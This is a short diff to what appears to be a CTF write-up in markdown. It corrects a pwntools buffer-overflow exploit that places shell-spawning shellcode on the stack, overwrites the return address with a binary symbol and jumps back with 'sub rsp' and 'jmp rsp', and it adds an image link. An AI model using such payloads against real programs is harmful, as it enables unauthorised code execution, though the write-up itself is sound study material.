@@ -74,12 +74,12 @@ members:
 
 context.arch = 'amd64'
 sc1 = asm(shellcraft.sh())
-sc2 = asm('sub rsp,64')//48字节的字符串+8字节的rsp+8字节的rbp，跳回开头
+sc2 = asm('sub rsp,56')//48字节的字符串+8字节的rsp，跳回开头
 sc3 = asm('jmp rsp')
 elf = ELF('hello')
 payload = sc1 + b'a'*(56-len(sc1)) + p64(elf.symbols['bd']) + sc2 + sc3
 ```
-
+![image.png](https://i.loli.net/2020/05/18/4ylt13zbIZ2LXfE.png)
 ![image.png](https://i.loli.net/2020/05/11/DCm7Wv6HMOnVLja.png)
 
 ## Web
